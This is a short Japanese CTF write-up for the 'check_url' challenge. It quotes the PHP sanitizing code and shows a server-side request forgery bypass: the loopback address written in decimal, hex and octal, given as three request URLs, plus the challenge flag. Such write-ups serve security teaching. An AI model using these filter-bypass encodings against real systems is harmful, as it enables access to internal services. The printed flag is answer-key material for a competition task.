# check_url

> Have you ever used curl ?

## Write-up

`index.php`を読むと指定したURLへcurlでアクセスしてiframeに表示しています。
クライアントのIPアドレスが`127.0.0.1`の場合にフラグが表示されます。
URLはチェックされているので`https://127.0.0.1`や`https://localhost`は使えそうにありません。

```php
              $url = $_GET["url"];
              if ($url !== "https://www.example.com"){
                $url = preg_replace("/[^a-zA-Z0-9\/:]+/u", "👻", $url); //Super sanitizing
              }
              if(stripos($url,"localhost") !== false || stripos($url,"apache") !== false){
                die("do not hack me!");
              }
```

`localhost`を違う方法で表現できないか調べてみると
[127.0.0.1(localhost)を一番面白く表記できた奴が優勝](https://qiita.com/naka_kyon/items/88478be20b300e757fc0)
という記事が見つかりました。
`.`は`👻`に置き換えられるので`.`のない表現を全部試します。

- <https://check-url.quals.beginners.seccon.jp/?url=https://2130706433>
- <https://check-url.quals.beginners.seccon.jp/?url=https://0x7F000001>
- <https://check-url.quals.beginners.seccon.jp/?url=https://017700000001>

## Flag

`ctf4b{5555rf_15_53rv3r_51d3_5up3r_54n171z3d_r3qu357_f0r63ry}`
